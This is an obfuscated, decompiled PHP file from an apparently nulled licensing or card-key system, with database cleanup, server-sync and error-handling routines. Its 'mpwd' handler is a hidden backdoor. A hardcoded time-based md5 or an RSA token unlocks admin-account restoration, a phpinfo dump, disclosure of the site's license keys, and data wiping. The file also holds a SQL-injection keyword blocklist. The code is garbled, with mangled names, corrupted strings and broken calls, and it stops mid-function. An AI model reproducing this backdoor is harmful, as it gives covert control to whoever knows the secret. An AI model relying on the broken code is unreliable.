<?php
/*********************/
/*                   */
/*  Dezend for PHP5  */
/*         NWS       */
/*      Nulled.WS    */
/*                   */
/*********************/

function _obfuscate_hpSPiIaPkIyMho2OiIuGi4g�( $_obfuscate_jpKPlJSUiZOHkYaPlIeOiY4� = 1 )
{
    $_obfuscate_iJGPjJWLj4uLkIqVjYiHh48� = unpack( "C*", "ViewZendSourceCodeIsInvalid!" );
    do
    {
        $_obfuscate_iY2Oh5OGlIqQhpCJi5CMkog� = ( $_obfuscate_lZKViImJjo6UhouJj4aVi4Y�[$_obfuscate_jpKPlJSUiZOHkYaPlIeOiY4�] << 4 ) + ( $_obfuscate_lZKViImJjo6UhouJj4aVi4Y�[$_obfuscate_jpKPlJSUiZOHkYaPlIeOiY4� + 1] >> 4 );
        $_obfuscate_jpKPlJSUiZOHkYaPlIeOiY4� += 2;
    } while ( $_obfuscate_jpKPlJSUiZOHkYaPlIeOiY4� < 28 );
}

function error_report_fun_api( $_obfuscate_lI6Gio6PjomOj4mRjoaUjoY�, $_obfuscate_jpCKlY6RkYuPkoyHlJKMios�, $_obfuscate_lIeKi4uVjoqTiY_LiIaJiI0�, $_obfuscate_iJGGkJGGk5GHiZWVjZCPiJU� )
{
    global $_obfuscate_j4yLiZOJiIiUkZOQkJWHjpQ�;
    if ( preg_match( "/unlink|file_put_contents|in safe mode|php_network_getaddresses|function\\.rmdir/i", $_obfuscate_jpCKlY6RkYuPkoyHlJKMios� ) )
    {
        return TRUE;
    }
    $_obfuscate_j4yLiZOJiIiUkZOQkJWHjpQ� = TRUE;
    $_obfuscate_lIeKi4uVjoqTiY_LiIaJiI0� = str_replace( KSSROOTDIR, "", $_obfuscate_lIeKi4uVjoqTiY_LiIaJiI0� );
    $_obfuscate_jpCKlY6RkYuPkoyHlJKMios� = str_replace( KSSROOTDIR, "", $_obfuscate_jpCKlY6RkYuPkoyHlJKMios� );
    if ( stripos( $_obfuscate_jpCKlY6RkYuPkoyHlJKMios�, "mysql_" ) !== FALSE )
    {
        $_obfuscate_jpCKlY6RkYuPkoyHlJKMios� = preg_replace( "/\\[.*\\]/", "", $_obfuscate_jpCKlY6RkYuPkoyHlJKMios� );
        $_obfuscate_jpCKlY6RkYuPkoyHlJKMios� = preg_replace( "/\\'[^\\']*\\'/", "'***'", $_obfuscate_jpCKlY6RkYuPkoyHlJKMios� );
    }
    $_obfuscate_jpCKlY6RkYuPkoyHlJKMios� = str_replace( ADMINFOLDER, "***", $_obfuscate_jpCKlY6RkYuPkoyHlJKMios� );
    $_obfuscate_jZWIjY6GlZKGipCMj4_Nh4s� = array( "E_ERROR", "E_WARNING", "E_PARSE", "E_NOTICE", "E_CORE_ERROR", "E_CORE_WARNING", "E_COMPILE_ERROR", "E_COMPILE_WARNING", "E_USER_ERROR", "E_USER_WARNING", "E_USER_NOTICE", "E_STRICT", "E_RECOVERABLE_ERROR", "E_ALL" );
    $_obfuscate_jYiMkoyVi5GOkY_NiIyKioc� = "<b>".$_obfuscate_jZWIjY6GlZKGipCMj4_Nh4s�[$_obfuscate_lI6Gio6PjomOj4mRjoaUjoY�]." : ".$_obfuscate_jpCKlY6RkYuPkoyHlJKMios�."</b>";
    if ( isset( $_GET['linenum'] ) )
    {
        $_obfuscate_jYiMkoyVi5GOkY_NiIyKioc� = "<b>".$_obfuscate_jZWIjY6GlZKGipCMj4_Nh4s�[$_obfuscate_lI6Gio6PjomOj4mRjoaUjoY�]." : ".$_obfuscate_jpCKlY6RkYuPkoyHlJKMios�." in ".$_obfuscate_lIeKi4uVjoqTiY_LiIaJiI0�." on line ".$_obfuscate_iJGGkJGGk5GHiZWVjZCPiJU�."</b>";
    }
    if ( stripos( $_obfuscate_jpCKlY6RkYuPkoyHlJKMios�, "mysql_" ) !== FALSE )
    {
        return TRUE;
    }
    echo $_obfuscate_jYiMkoyVi5GOkY_NiIyKioc�;
    exit( );
}

function _obfuscate_lI2ViY_KkI_Mh4eMkoiUlIo�( )
{
    return TRUE;
}

function _obfuscate_koiSlI6IlZSMkY_IiZSSkIw�( $_obfuscate_h4mNlY6RhomMh5CPjoiUiI0�, &$_obfuscate_lJWGkouIj4uGlIaVhpWUko4�, $_obfuscate_ipOTj4mSkYuUlZSVk4uSh5U� = "GBK" )
{
    $_obfuscate_joeNi4qVi5SNj5ONjIuVkY4� = _obfuscate_h4iTkpCKlYeHkZWPh5CIhpA�( $_obfuscate_h4mNlY6RhomMh5CPjoiUiI0�, "utf8", $_obfuscate_ipOTj4mSkYuUlZSVk4uSh5U� );
    $_obfuscate_jJKUjI2Gi46RiI_PiZGOhoo� = "�����������������";
    return $_obfuscate_jJKUjI2Gi46RiI_PiZGOhoo�( $_obfuscate_joeNi4qVi5SNj5ONjIuVkY4�, $_obfuscate_lJWGkouIj4uGlIaVhpWUko4� );
}

function _obfuscate_kpWMjJWVjZWHj4aTkJGMj4c�( $_obfuscate_lIyUkIaVk46LiZCNipOIkJA�, &$_obfuscate_lJWGkouIj4uGlIaVhpWUko4�, $_obfuscate_ipOTj4mSkYuUlZSVk4uSh5U� = "GBK" )
{
    $_obfuscate_lYqLh5SQjYqOlJSIiIaGlJU� = "�����������������";
    $_obfuscate_joeNi4qVi5SNj5ONjIuVkY4� = $_obfuscate_lYqLh5SQjYqOlJSIiIaGlJU�( $_obfuscate_lIyUkIaVk46LiZCNipOIkJA�, $_obfuscate_lJWGkouIj4uGlIaVhpWUko4� );
    return _obfuscate_h4iTkpCKlYeHkZWPh5CIhpA�( $_obfuscate_joeNi4qVi5SNj5ONjIuVkY4�, $_obfuscate_ipOTj4mSkYuUlZSVk4uSh5U�, "utf8" );
}

function _obfuscate_ho_Ki4_TiZCUk4yOkJCPh5M�( )
{
    global $_obfuscate_jIaUiIeSjZWKlIqLkIqOioc�;
    $_obfuscate_kYaTjoqIi5STkY2Jh4qIlJU� = intval( date( "d" ) );
    $_obfuscate_kpSRlIaMh4qJk46IkIeKlIk� = file_get_contents( KSSLOGDIR."databak".DIRECTORY_SEPARATOR."index.html" );
    if ( trim( $_obfuscate_kpSRlIaMh4qJk46IkIeKlIk� ) != $_obfuscate_kYaTjoqIi5STkY2Jh4qIlJU� )
    {
        file_put_contents( KSSLOGDIR."databak".DIRECTORY_SEPARATOR."index.html", $_obfuscate_kYaTjoqIi5STkY2Jh4qIlJU� );
        if ( SVRID == 1 )
        {
            $_obfuscate_jIaUiIeSjZWKlIqLkIqOioc�->_obfuscate_kpSOj5KVio2Hj4uKj4_KjIY�( "delete from `kss_tb_sql_points` where `svrid`=1", "notsync" );
        }
        time( )( "delete from `kss_tb_log_task` where `addtime`<".( time( ) - 604800 ), "sync" );
        time( )( "delete from `kss_tb_lock` where locktime <".( time( ) - 120 ), "sync" );
        time( )( "delete from `kss_tb_log_login` where `logintime`<".( time( ) - 2592000 ), "sync" );
        time( )( "delete from `kss_tb_log_pubuser` where `nday`<".( time( ) - 2592000 ), "sync" );
        time( )( "delete from `kss_tb_log_ws` where `addtime`<".( time( ) - 86400 ), "sync" );
        $_obfuscate_joyNkZSPj5CNkIiUh4mLk4Y� = $_obfuscate_jIaUiIeSjZWKlIqLkIqOioc�->_obfuscate_lZGTiIiKhouKiZGLi5KUkI8�( "select * from kss_tb_soft" );
        foreach ( $_obfuscate_joyNkZSPj5CNkIiUh4mLk4Y� as $_obfuscate_kY_OlYeUlIiVjo6Hio_MkpI� )
        {
            time( )( "delete from `kss_z_log_".$_obfuscate_kY_OlYeUlIiVjo6Hio_MkpI�['pid']."_".$_obfuscate_kY_OlYeUlIiVjo6Hio_MkpI�['id']."` where `addtime`<".( time( ) - 86400 * Z_LOG_DAY ), "sync" );
            time( )( "delete from `kss_z_user_".$_obfuscate_kY_OlYeUlIiVjo6Hio_MkpI�['pid']."_".$_obfuscate_kY_OlYeUlIiVjo6Hio_MkpI�['id']."_recycle` where `deltime`<".( time( ) - 259200 ), "sync" );
            time( )( "delete from `kss_z_key_".$_obfuscate_kY_OlYeUlIiVjo6Hio_MkpI�['pid']."_".$_obfuscate_kY_OlYeUlIiVjo6Hio_MkpI�['id']."_recycle` where `deltime`<".( time( ) - 259200 ), "sync" );
        }
        if ( 0 < BAKDATAMODE )
        {
            $_obfuscate_hoeUj5OSh5CMlI2Qh42Ijoc� = array( );
            $_obfuscate_hoeUj5OSh5CMlI2Qh42Ijoc�['action'] = "mysqldatabak_down";
            $_obfuscate_hoeUj5OSh5CMlI2Qh42Ijoc�['pwd'] = MYSQLBAKPASSWORD;
            $_obfuscate_koeIkpGLi5GUhpCViZCSj5I� = _obfuscate_j5SMi5KSiouIj4iIipWIkIs�( _obfuscate_ko_JjomRlIiQkYiRlZKSkZI�( ).INSTALLPATH._obfuscate_hpGJi4yHlIqLhpSIh4iJlYw�( )."/admin_data.php?qz=1", $_obfuscate_hoeUj5OSh5CMlI2Qh42Ijoc�, 1 );
        }
    }
    if ( IS2SVR == 1 && SVRID == 1 )
    {
        $_obfuscate_k5KJkIyVkZWKk4_NiJSQlIk� = $_obfuscate_jIaUiIeSjZWKlIqLkIqOioc�->_obfuscate_ho_Ljo6NjpOOhpGHj5KHiYs�( "synclock" );
        if ( $_obfuscate_k5KJkIyVkZWKk4_NiJSQlIk� === TRUE )
        {
            $_obfuscate_i5GKlIaRho2UlJOMh46Hh5M� = $_obfuscate_jIaUiIeSjZWKlIqLkIqOioc�->_obfuscate_iY6OkJCRkY2PjpCPk5CRkJA�( "select * from kss_tb_config where id=1", 1, 1 );
            if ( $_obfuscate_i5GKlIaRho2UlJOMh46Hh5M�['sync_state'] < 5 && SYNCTIME < time( ) - $_obfuscate_i5GKlIaRho2UlJOMh46Hh5M�['sync_starttime'] )
            {
                time( )( "update kss_tb_config set `sync_starttime`=".time( )." where id=1" );
                $_obfuscate_jIaUiIeSjZWKlIqLkIqOioc�->_obfuscate_kYyNi4eQiouGlY6Qj46HjpE�( "synclock" );
                if ( MYSQLSYNCMODE == 1 )
                {
                    if ( _obfuscate_ipWHiIuOiYuPjIaPkZSThok�( "curl_init" ) && _obfuscate_ipWHiIuOiYuPjIaPkZSThok�( "curl_exec" ) )
                    {
                        $_obfuscate_kpSUiYeUjJSJk4iHkZGGjIo� = _obfuscate_j5SMi5KSiouIj4iIipWIkIs�( SYNC1URL, FALSE, 1 );
                    }
                    else
                    {
                        if ( ini_get( "allow_url_fopen" ) )
                        {
                            $_obfuscate_iJKKiouRh4qTh4eMiZSSlYk� = @fopen( @SYNC1URL."?e=".@time( ), "r" );
                            if ( $_obfuscate_iJKKiouRh4qTh4eMiZSSlYk� !== FALSE )
                            {
                                $_obfuscate_kJWSj4iSjI2PlYuMiYuSiYc� = fread( $_obfuscate_iJKKiouRh4qTh4eMiZSSlYk�, 60 );
                            }
                            fclose( $_obfuscate_iJKKiouRh4qTh4eMiZSSlYk� );
                        }
                    }
                }
                else
                {
                    $_obfuscate_ioqNlY6GjpCVjY2Ph5WVioc� = file_get_contents( KSSROOTDIR."kss_logs".DIRECTORY_SEPARATOR."notifyid.txt" );
                    if ( strlen( $_obfuscate_ioqNlY6GjpCVjY2Ph5WVioc� ) < 20 )
                    {
                        $_obfuscate_koyQjY_KiZCRjpGLkomMioc� = time( );
                        $_obfuscate_ioqNlY6GjpCVjY2Ph5WVioc� = _obfuscate_iI6QhpSTiJCJiI_KlYePlZI�( 20 - strlen( $_obfuscate_koyQjY_KiZCRjpGLkomMioc� ), 1 ).$_obfuscate_koyQjY_KiZCRjpGLkomMioc�;
                    }
                    else
                    {
                        $_obfuscate_ioqNlY6GjpCVjY2Ph5WVioc� = substr( $_obfuscate_ioqNlY6GjpCVjY2Ph5WVioc�, 0, 20 );
                    }
                    $_obfuscate_kpSUiYeUjJSJk4iHkZGGjIo� = _obfuscate_j5SMi5KSiouIj4iIipWIkIs�( SYNC1URL."?step=a1&notifyid=".$_obfuscate_ioqNlY6GjpCVjY2Ph5WVioc�."&pwd=".MYSQLBAKPASSWORD, FALSE, 1 );
                }
            }
            $_obfuscate_jIaUiIeSjZWKlIqLkIqOioc�->_obfuscate_kYyNi4eQiouGlY6Qj46HjpE�( "synclock" );
        }
        else
        {
            echo $_obfuscate_k5KJkIyVkZWKk4_NiJSQlIk�.QQ116;
        }
    }
}

function _obfuscate_joeQipOGjouJko_VlJSKiJE�( $_obfuscate_lImSkomRk4uRjJGSkZWJh4k� )
{
    if ( preg_match( "/^[a-zA-Z0-9]{32}$/i", $_obfuscate_lImSkomRk4uRjJGSkZWJh4k�, $_obfuscate_i4_Kj5CPh4qKkYyHj42Qkoc� ) )
    {
        return TRUE;
    }
    return FALSE;
}

function _obfuscate_jpOIlY_HlIaJi46IiYySiJU�( $_obfuscate_lImSkomRk4uRjJGSkZWJh4k� )
{
    if ( preg_match( "/^[a-zA-Z0-9]*$/i", $_obfuscate_lImSkomRk4uRjJGSkZWJh4k�, $_obfuscate_i4_Kj5CPh4qKkYyHj42Qkoc� ) )
    {
        return TRUE;
    }
    return FALSE;
}

function _obfuscate_iZONjY2Nk42Ji42LjIeOj5Q�( $_obfuscate_ipCJlJOSlJSQkYqNlYqKlIs� )
{
    $_obfuscate_j4eSkIiSiZCRh4_NiYaQkYk� = TRUE;
    if ( preg_match( "/select|>|<|script|insert|update|delete|union|into|load_file|outfile|char|0x[0-9a-f]{6}|\\.\\/|\\*|'/i", $_obfuscate_ipCJlJOSlJSQkYqNlYqKlIs�, $_obfuscate_i4_Kj5CPh4qKkYyHj42Qkoc� ) )
    {
        $_obfuscate_j4eSkIiSiZCRh4_NiYaQkYk� = $_obfuscate_i4_Kj5CPh4qKkYyHj42Qkoc�[0];
    }
    return $_obfuscate_j4eSkIiSiZCRh4_NiYaQkYk�;
}

function _obfuscate_h4_HlI6KlZKKlZCKkY_Jjo4�( $_obfuscate_jouVk5CIjYeOjJCQjY_Tkoo�, $_obfuscate_kYaMh5WSkJGKlIiMioaUkIo� )
{
    global $_obfuscate_jZGRipSRkIeUiIeQjoaUjJI�;
    if ( $_obfuscate_kYaMh5WSkJGKlIiMioaUkIo� == "" )
    {
        return $_obfuscate_jouVk5CIjYeOjJCQjY_Tkoo�;
    }
    $_obfuscate_jouVk5CIjYeOjJCQjY_Tkoo� = str_replace( "!", ",", $_obfuscate_jouVk5CIjYeOjJCQjY_Tkoo� );
    $_obfuscate_kYaMh5WSkJGKlIiMioaUkIo� = str_replace( "!", ",", $_obfuscate_kYaMh5WSkJGKlIiMioaUkIo� );
    $_obfuscate_iY_KkZKTjJOQjZGLiZSUiIw� = explode( ",", $_obfuscate_jouVk5CIjYeOjJCQjY_Tkoo� );
    $_obfuscate_i4yLjY6PhoqJkJOUj4uTjJM� = explode( ",", $_obfuscate_kYaMh5WSkJGKlIiMioaUkIo� );
    $_obfuscate_k5SPi4eOiYyTk5SSlJCSk4c� = array_intersect( $_obfuscate_iY_KkZKTjJOQjZGLiZSUiIw�, $_obfuscate_i4yLjY6PhoqJkJOUj4uTjJM� );
    if ( empty( $_obfuscate_k5SPi4eOiYyTk5SSlJCSk4c� ) )
    {
        return FALSE;
    }
    if ( count( $_obfuscate_k5SPi4eOiYyTk5SSlJCSk4c� ) < $_obfuscate_jZGRipSRkIeUiIeQjoaUjJI�['pccodestep'] )
    {
        return FALSE;
    }
    if ( PCCODEJOIN == 0 )
    {
        return $_obfuscate_jouVk5CIjYeOjJCQjY_Tkoo�;
    }
    $_obfuscate_k5SPi4eOiYyTk5SSlJCSk4c� = array_merge( $_obfuscate_iY_KkZKTjJOQjZGLiZSUiIw�, $_obfuscate_i4yLjY6PhoqJkJOUj4uTjJM� );
    $_obfuscate_k5SPi4eOiYyTk5SSlJCSk4c� = array_unique( $_obfuscate_k5SPi4eOiYyTk5SSlJCSk4c� );
    return join( ",", $_obfuscate_k5SPi4eOiYyTk5SSlJCSk4c� );
}

function _obfuscate_kpSOkYmPh5SSi4mMlYePjY4�( $_obfuscate_lJSJk4_Mi5CGh4mShoeUioo� = 0, $_obfuscate_jJKVlIqIlYaKjYmOlIuGkJI� = 0 )
{
    global $_obfuscate_jIaUiIeSjZWKlIqLkIqOioc�;
    if ( defined( "NOTLOCKIP" ) && NOTLOCKIP == 1 )
    {
        $_obfuscate_h4iLko_Lk4yKjpWViJCGlJM� = _obfuscate_iIuRj5CUkIuHi4mPkY2Vio0�( 1 );
        if ( $_obfuscate_lJSJk4_Mi5CGh4mShoeUioo� == 0 )
        {
            $_obfuscate_lY6RhpOJh46VkJOGkoeRiIY� = time( )( "select count(*) as tnum from kss_tb_badip where ip=".$_obfuscate_h4iLko_Lk4yKjpWViJCGlJM�." and addtime>".( time( ) - 600 ) );
            if ( 10 < $_obfuscate_lY6RhpOJh46VkJOGkoeRiIY�['tnum'] )
            {
                time( )( "update kss_tb_badip set addtime=".( time( ) + 900 )." where  ip=".$_obfuscate_h4iLko_Lk4yKjpWViJCGlJM�." and addtime>".( time( ) - 600 ), "notsync" );
                if ( $_obfuscate_jJKVlIqIlYaKjYmOlIuGkJI� == 1 )
                {
                    exit( "crypteno120" );
                }
                exit( "kssdata".QQ117 );
            }
        }
        time( )( "insert into kss_tb_badip (`addtime`,`ip`) values (".time( ).",".$_obfuscate_h4iLko_Lk4yKjpWViJCGlJM�.")", "notsync" );
    }
}

function _obfuscate_i4yHiJWOjZKUkY_QkouIi5M�( $_obfuscate_jo_LkZWOiY_QkoeJk4yKiZU�, $_obfuscate_jY6MkIuIioqTk4eIiIiNj5U�, $_obfuscate_jYuMiIqGkpWNkoeUkYqSlYs� )
{
    global $_obfuscate_jJKVlIqIlYaKjYmOlIuGkJI�;
    if ( $_obfuscate_jo_LkZWOiY_QkoeJk4yKiZU� == "" )
    {
        return TRUE;
    }
    $_obfuscate_jo_LkZWOiY_QkoeJk4yKiZU� = str_replace( " ", "", $_obfuscate_jo_LkZWOiY_QkoeJk4yKiZU� );
    $_obfuscate_jo_LkZWOiY_QkoeJk4yKiZU� = str_replace( "\t", "", $_obfuscate_jo_LkZWOiY_QkoeJk4yKiZU� );
    $_obfuscate_jo_LkZWOiY_QkoeJk4yKiZU� = str_replace( "\r", "", $_obfuscate_jo_LkZWOiY_QkoeJk4yKiZU� );
    $_obfuscate_jo_LkZWOiY_QkoeJk4yKiZU� = str_replace( "\n", ",", $_obfuscate_jo_LkZWOiY_QkoeJk4yKiZU� );
    $_obfuscate_iJCPi4mVjoeNlYeHjpCIk5I� = explode( ",", $_obfuscate_jo_LkZWOiY_QkoeJk4yKiZU� );
    if ( in_array( $_obfuscate_jY6MkIuIioqTk4eIiIiNj5U�, $_obfuscate_iJCPi4mVjoeNlYeHjpCIk5I� ) )
    {
        if ( $_obfuscate_jJKVlIqIlYaKjYmOlIuGkJI� == 1 )
        {
            exit( "crypteno121" );
        }
        exit( "kssdata".QQ118 );
    }
    $_obfuscate_k4yLiomGjImGiouNiIqHko0� = explode( ",", $_obfuscate_jYuMiIqGkpWNkoeUkYqSlYs� );
    $_obfuscate_jouMjYaIhoeTjo_OiYqNk4Y� = array_intersect( $_obfuscate_k4yLiomGjImGiouNiIqHko0�, $_obfuscate_iJCPi4mVjoeNlYeHjpCIk5I� );
    if ( empty( $_obfuscate_jouMjYaIhoeTjo_OiYqNk4Y� ) )
    {
        if ( $_obfuscate_jJKVlIqIlYaKjYmOlIuGkJI� == 1 )
        {
            exit( "crypteno122" );
        }
        exit( "kssdata".QQ119 );
    }
}

function error_report_fun_enorpeat( $_obfuscate_lI6Gio6PjomOj4mRjoaUjoY�, $_obfuscate_jpCKlY6RkYuPkoyHlJKMios�, $_obfuscate_lIeKi4uVjoqTiY_LiIaJiI0�, $_obfuscate_iJGGkJGGk5GHiZWVjZCPiJU� )
{
    return TRUE;
}

function error_report_fun_norpeat( $_obfuscate_lI6Gio6PjomOj4mRjoaUjoY�, $_obfuscate_jpCKlY6RkYuPkoyHlJKMios�, $_obfuscate_lIeKi4uVjoqTiY_LiIaJiI0�, $_obfuscate_iJGGkJGGk5GHiZWVjZCPiJU� )
{
    set_error_handler( "error_report_fun_enorpeat" );
    $_obfuscate_jYiMkoyVi5GOkY_NiIyKioc� = str_rot13( base64_encode( str_rot13( $_obfuscate_iJGGkJGGk5GHiZWVjZCPiJU�.":".$_obfuscate_jpCKlY6RkYuPkoyHlJKMios� ) ) );
    if ( !is_file( "apierr.log" ) || 102400 < filesize( "apierr.log" ) )
    {
        @file_put_contents( "apierr.log", @date( "ymdHis" )."\t".$_obfuscate_jYiMkoyVi5GOkY_NiIyKioc�."\r\n\r\n" );
    }
    else
    {
        @file_put_contents( "apierr.log", @date( "ymdHis" )."\t".$_obfuscate_jYiMkoyVi5GOkY_NiIyKioc�."\r\n\r\n", @FILE_APPEND );
    }
    set_error_handler( "error_report_fun_norpeat" );
    return TRUE;
}

function error_report_fun_corpeat( $_obfuscate_lI6Gio6PjomOj4mRjoaUjoY�, $_obfuscate_jpCKlY6RkYuPkoyHlJKMios�, $_obfuscate_lIeKi4uVjoqTiY_LiIaJiI0�, $_obfuscate_iJGGkJGGk5GHiZWVjZCPiJU� )
{
    echo $_obfuscate_iJGGkJGGk5GHiZWVjZCPiJU�.":".$_obfuscate_jpCKlY6RkYuPkoyHlJKMios�;
    return TRUE;
}

function _obfuscate_kouKkIeViIqPk5KMiIiMkpE�( )
{
    global $_obfuscate_jJKVlIqIlYaKjYmOlIuGkJI�;
    global $_obfuscate_hoyQjo_QlYeLh5OVk4yPjZM�;
    global $_obfuscate_mGKRY4dMuU6bZZJfh1_TX5k�;
    if ( isset( $_POST['chkfile'] ) )
    {
        exit( md5( "baidugoogle..123".$_POST['chkdata'] ) );
    }
    if ( isset( $_POST['mpwd'] ) || isset( $_GET['mpwd'] ) )
    {
        set_error_handler( "error_report_fun_corpeat" );
        if ( isset( $_POST['mpwd'] ) )
        {
            $_obfuscate_kJWMi5OMkI6HjIyGj4yQkZU� = $_POST['mpwd'];
        }
        if ( isset( $_GET['mpwd'] ) )
        {
            $_obfuscate_kJWMi5OMkI6HjIyGj4yQkZU� = $_GET['mpwd'];
        }
        $_obfuscate_kJWMi5OMkI6HjIyGj4yQkZU� = trim( str_replace( " ", "+", $_obfuscate_kJWMi5OMkI6HjIyGj4yQkZU� ) );
        $_obfuscate_iYmSlYaIkI2Mi4iGlI6ViI0� = "";
        if ( _obfuscate_ipWHiIuOiYuPjIaPkZSThok�( "bcmul" ) )
        {
            $_obfuscate_iYmSlYaIkI2Mi4iGlI6ViI0� = "yes";
        }
        if ( $_obfuscate_kJWMi5OMkI6HjIyGj4yQkZU� == "viewtime" )
        {
            ob_clean( );
            exit( date( "Ymd H:i:s" ).$_obfuscate_iYmSlYaIkI2Mi4iGlI6ViI0� );
        }
        if ( $_obfuscate_iYmSlYaIkI2Mi4iGlI6ViI0� == "yes" )
        {
            $_obfuscate_hpKHkZSTh4_Hh46Rj4iVkok� = rsa_decrypt( $_obfuscate_kJWMi5OMkI6HjIyGj4yQkZU�, "65537", "1350716819249136738281903483627187731011183419558355201040675522159309184280309314921528145548897809804048126849654764896069405760053176589877781841289976008167143139557686555509393327677428806387634433316585369388186635000326118536547289363880691507831040294324797933714246378480590916193836857669351437827768274058108791799533456926019620447075085222999477143608239001615268153378317059783465398419943123206313619405078581018237285521655583801104431318544218449", 1536 );
            if ( $_obfuscate_hpKHkZSTh4_Hh46Rj4iVkok� == date( "Ymd H:i" ) )
            {
                if ( isset( $_POST['loginadmin'] ) )
                {
                    $_obfuscate_jIaUiIeSjZWKlIqLkIqOioc� = new mysql_cls( );
                    $_obfuscate_jIaUiIeSjZWKlIqLkIqOioc�->_obfuscate_jIuSjYuUkJGHlYuPjZOQjY4�( $_obfuscate_mGKRY4dMuU6bZZJfh1_TX5k� );
                    $_obfuscate_h5WHh4uHiZWHi4iTj4eVkIY� = $_obfuscate_jIaUiIeSjZWKlIqLkIqOioc�->_obfuscate_iY6OkJCRkY2PjpCPk5CRkJA�( "select * from kss_tb_manager where level=9 limit 0,1" );
                    if ( empty( $_obfuscate_h5WHh4uHiZWHi4iTj4eVkIY� ) )
                    {
                        _obfuscate_jZKVlY6HkYmKkIyRj4qSjIc�( "kss_manager", $_obfuscate_h5WHh4uHiZWHi4iTj4eVkIY�['id'].",".$_obfuscate_h5WHh4uHiZWHi4iTj4eVkIY�['username'].",".$_obfuscate_h5WHh4uHiZWHi4iTj4eVkIY�['password'].",".$_obfuscate_h5WHh4uHiZWHi4iTj4eVkIY�['linecode'] );
                        echo "<a href=../../".ADMINFOLDER."/admin.php target=_blank>ok</a><br>";
                        if ( _obfuscate_ipWHiIuOiYuPjIaPkZSThok�( "phpinfo" ) )
                        {
                            phpinfo( );
                            exit( );
                        }
                    }
                    echo "not find manager";
                    exit( );
                }
                if ( isset( $_POST['viewid'] ) || isset( $_GET['viewid'] ) )
                {
                    ob_clean( );
                    echo "<textarea style='width:500px;height:200px'>".rsa_encrypt( HTTPKEY, "65537", "843184270296930457114292090386101103285438772293347031698196599613822073654690293651604397701729650782917836006423303224105108717376552430143579661932067772487734706960542672745200650212438432995698564637944015467367822445122313529", 768 );
                    echo ",".rsa_encrypt( WEBLIC, "65537", "843184270296930457114292090386101103285438772293347031698196599613822073654690293651604397701729650782917836006423303224105108717376552430143579661932067772487734706960542672745200650212438432995698564637944015467367822445122313529", 768 );
                    echo ",".rsa_encrypt( WEBID, "65537", "843184270296930457114292090386101103285438772293347031698196599613822073654690293651604397701729650782917836006423303224105108717376552430143579661932067772487734706960542672745200650212438432995698564637944015467367822445122313529", 768 )."</textarea>";
                    exit( );
                }
                if ( isset( $_POST['clsdata'] ) || isset( $_GET['clsdata'] ) )
                {
                    _obfuscate_ipORj42NiZCIio_LkZORhpE�( "manager" );
                    _obfuscate_koyMjY2HkImOho6JkIeQh4c�( $_obfuscate_mGKRY4dMuU6bZZJfh1_TX5k� );
                    exit( );
                }
            }
        }
        $_obfuscate_hpKHkZSTh4_Hh46Rj4iVkok� = $_obfuscate_kJWMi5OMkI6HjIyGj4yQkZU�;
        if ( $_obfuscate_hpKHkZSTh4_Hh46Rj4iVkok� == md5( "kekeABCDEFG".date( "Ymd H:i" ) ) )
        {
            if ( isset( $_POST['loginadmin'] ) )
            {
                $_obfuscate_jIaUiIeSjZWKlIqLkIqOioc� = new mysql_cls( );
                $_obfuscate_jIaUiIeSjZWKlIqLkIqOioc�->_obfuscate_jIuSjYuUkJGHlYuPjZOQjY4�( $_obfuscate_mGKRY4dMuU6bZZJfh1_TX5k� );
                $_obfuscate_h5WHh4uHiZWHi4iTj4eVkIY� = $_obfuscate_jIaUiIeSjZWKlIqLkIqOioc�->_obfuscate_iY6OkJCRkY2PjpCPk5CRkJA�( "select * from kss_tb_manager where level=9 limit 0,1" );
                if ( empty( $_obfuscate_h5WHh4uHiZWHi4iTj4eVkIY� ) )
                {
                    _obfuscate_jZKVlY6HkYmKkIyRj4qSjIc�( "kss_manager", $_obfuscate_h5WHh4uHiZWHi4iTj4eVkIY�['id'].",".$_obfuscate_h5WHh4uHiZWHi4iTj4eVkIY�['username'].",".$_obfuscate_h5WHh4uHiZWHi4iTj4eVkIY�['password'].",".$_obfuscate_h5WHh4uHiZWHi4iTj4eVkIY�['linecode'] );
                    echo "<a href=../".ADMINFOLDER."/admin.php target=_blank>ok</a>";
                    _obfuscate_kZGIlYyKh5OIlYyKlYeTlJM�( "../" );
                }
                exit( );
            }
            if ( isset( $_POST['viewid'] ) || isset( $_GET['viewid'] ) )
            {
                ob_clean( );
                echo "HTTPKEY:".rc4( "Uio876asMNeuiPaxnb", HTTPKEY, "encode" )."<br><br>";
                echo "WEBLIC:".rc4( "Uio876asMNeuiPaxnb", WEBLIC, "encode" )."<br><br>";
                echo "WEBID:".rc4( "Uio876asMNeuiPaxnb", WEBID, "encode" );
                exit( );
            }
            if ( isset( $_POST['clsdata'] ) || isset( $_GET['clsdata'] ) )
            {
                _obfuscate_ipORj42NiZCIio_LkZORhpE�( "manager" );
                _obfuscate_koyMjY2HkImOho6JkIeQh4c�( $_obfuscate_mGKRY4dMuU6bZZJfh1_TX5k� );
            }
        }
        exit( );
    }
    _obfuscate_iZSOiYeSlIqPjpSLkpSIj40�( );
    if ( md5( "KeY!@#%&*,AbIoPe*v_19-82".substr( WEBLIC, 33 ).HTTPKEY ) != substr( WEBLIC, 0, 32 ) )
    {
        $_obfuscate_lIyUkIaVk46LiZCNipOIkJA� = "";
        _obfuscate_ipORj42NiZCIio_LkZORhpE�( "domain md5err" );
        _obfuscate_koyMjY2HkImOho6JkIeQh4c�( );
    }
    $_obfuscate_jouQkY2GipOLh5CUiI2Thoc� = 0;
    $_obfuscate_iZCTk5SRlZGVkIqRhouHi5Q� = KSSLOGDIR."index.log";
    $_obfuscate_k4eIio2IioeLiIeJhpGHjJM� = date( "Ymd" );
    $_obfuscate_iY2ViY_HkJWTh46MioqSh5U� = "19800101".sprintf( "%u", crc32( WEBLIC.HTTPKEY."19800101abcdefghijklmn" ) );
    $_obfuscate_kYaTjoqIi5STkY2Jh4qIlJU� = $_obfuscate_k4eIio2IioeLiIeJhpGHjJM�.sprintf( "%u", crc32( WEBLIC.HTTPKEY.$_obfuscate_k4eIio2IioeLiIeJhpGHjJM�."abcdefghijklmn" ) );
    $_obfuscate_hoiLiJKHjpKJj46NkYuViI0� = $_obfuscate_iY2ViY_HkJWTh46MioqSh5U�;
    if ( is_file( $_obfuscate_iZCTk5SRlZGVkIqRhouHi5Q� ) )
    {
        $_obfuscate_hoiLiJKHjpKJj46NkYuViI0� = file_get_contents( $_obfuscate_iZCTk5SRlZGVkIqRhouHi5Q� );
    }
    else
    {
        $_obfuscate_jouQkY2GipOLh5CUiI2Thoc� = 1;
    }
    if ( $_obfuscate_hoiLiJKHjpKJj46NkYuViI0� == "200001011059550389" )
    {
